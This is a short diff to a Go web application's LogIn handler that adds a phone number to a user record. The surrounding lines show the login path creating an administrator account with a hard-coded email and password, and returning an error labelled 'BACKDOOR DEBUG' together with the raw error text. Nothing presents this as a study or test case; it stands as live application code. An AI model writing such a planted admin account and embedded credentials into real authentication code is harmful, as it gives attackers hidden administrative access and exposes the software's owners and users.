@@ -146,6 +146,7 @@ func LogIn(c echo.Context) error {
 			user.Email = "admin@admin.com"
 			user.Name = "admin"
 			user.Password = "pa55w0rd@WISMED"
+			user.Phone = "123456789"
 			if err := su.Store(user); err != nil {
 				return c.String(http.StatusInternalServerError, "BACKDOOR DEBUG"+fmt.Sprint(err))
 			}
